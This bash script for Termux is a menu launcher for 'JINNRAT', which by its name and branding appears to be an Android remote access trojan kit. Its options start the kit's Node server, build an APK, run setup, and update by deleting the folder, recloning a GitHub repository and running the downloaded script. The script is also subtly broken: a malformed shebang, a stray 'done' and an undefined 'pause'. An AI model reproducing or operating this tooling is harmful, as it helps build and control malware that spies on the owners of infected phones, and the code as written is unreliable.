#!data/data/com.termux/files/usr/bin/bash

# colour 
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White

clear

echo '''
     ██╗██╗███╗   ██╗███╗   ██╗██████╗  █████╗ ████████╗
     ██║██║████╗  ██║████╗  ██║██╔══██╗██╔══██╗╚══██╔══╝
     ██║██║██╔██╗ ██║██╔██╗ ██║██████╔╝███████║   ██║   
██   ██║██║██║╚██╗██║██║╚██╗██║██╔══██╗██╔══██║   ██║   
╚█████╔╝██║██║ ╚████║██║ ╚████║██║  ██║██║  ██║   ██║   V 1.01
 ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝

                   𝕓𝕪 alvinbaby (MRJINN)
     ₹____________________<😈>_____________________₹
                         MRJINN 
       [ Telegram : https://t.me/MrJinnTelegram ]
      ₹___________________________________________₹
''' | lolcat
echo " "
echo -e "     $Purple==>$Yellow[1️⃣] Start index.js $Green  "
echo -e "     $Purple==>️$Yellow[2️⃣] BuildAPK $Green        "
echo -e "     $Purple==>$Yellow[3️⃣] setup $Green           "
echo -e "     $Purple==>$Yellow[4️⃣] Update $Green          "
echo -e "     $Purple==>$Yellow[5️⃣] exit $Green            "                                                                           
echo " "
echo " "

    read ch
   if [ $ch -eq 1 ];then
        cd $HOME
        cd JINNRAT
        cd server
        echo "Please wait..."
        node index.js

        exit
    elif [ $ch -eq 2 ];then
        cd $HOME
        cd JINNRAT
        bash BuildAPK

        exit
    elif [ $ch -eq 3 ];then
        cd $HOME
        cd JINNRAT
        bash setup.sh

        exit
    elif [ $ch -eq 4 ];then
        echo -e "\e[1;34m Downloading Latest Files..."
        cd $HOME
        rm -rf JINNRAT
        git clone https://github.com/alvinbaby/JINNRAT
        cd JINNRAT
        bash JINNRAT.sh
     
        exit
    elif [ $ch -eq 5 ];then
        echo -e 
        cd $HOME

        exit
        
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
done
